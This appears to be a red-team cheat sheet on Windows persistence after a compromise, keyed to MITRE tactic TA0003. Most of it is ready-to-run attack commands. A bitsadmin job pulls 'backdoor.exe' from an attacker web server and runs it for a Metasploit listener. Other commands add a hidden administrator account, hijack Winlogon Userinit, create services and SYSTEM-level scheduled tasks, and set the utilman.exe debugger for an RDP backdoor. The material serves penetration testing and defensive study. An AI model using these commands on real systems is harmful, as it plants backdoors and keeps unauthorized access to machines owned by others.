# Persistence

([MITRE Tactic TA0003](https://attack.mitre.org/tactics/TA0002/))

Reasons for wanting persistence on a machine or network:
1. Backdooring and post-detection re-entrance.
2. Stability and a operational section of the network to work from.
3. Gaining foothold a hard to reproduce, especially if is phished for.
4. Re-exploitation is not alway possible post compromised or is also not fittly stealthy.
5. The SOC or Blue/Purple teams may have or would make significantly easier to detect.

For specifically [[Active-Directory-Persistence]] or [[Windows-Persistence]] or [[Linux-Persistence]].


## Persistence Bottom-Up

#### Startup folder persistence
```
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
Edit the registry, Startup from registry editing
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

#### BITS Jobs
```powershell
# Note: In order to work you have to have a webserver running so BITS can download the backdoor and Metasploit listening for connections.
# ALSO Note: BITS is very unstable and can and might give you just temporary persistence.
bitsadmin /addfile backdoor "http://attackbox:port/backdoor.exe" "C:\Users\%username%\somewhere\backdoor.exe"
bitsadmin /SetNotifyCmdline 1 cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C:\path\backdoor.exe"
bitsadmin /SetMinRetryDelay backdoor 30
bitsadmin /resume
```


##  Persistence Top-Down
#### Creating another administrator user
```powershell
net user /add <user> <password>
net localgroup Administrators backdoor /add
```
####  Edit the registry
User logon that sends you a shell:
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH_TO_BINARY>" /f 
```

#### Persistence by creating a service
```powershell
New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<PATH_TO_BINARY>" -Description "<SERVICE_DESCRIPTION>" -StartupType "Boot"
```
#### Scheduled tasks
```powershell
New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/ C:\path\backdoor.exe"
New-ScheduledTaskTrigger -AtlogOn
New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest
New-ScheduledTaskSettingsSet
Register-ScheduledTask -Action $A -Trigger $B -Principal $C -Settings $D
Register-ScheduledTask Backdoor -InputObject $E
```
####  Backdooring RDP
```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f	
```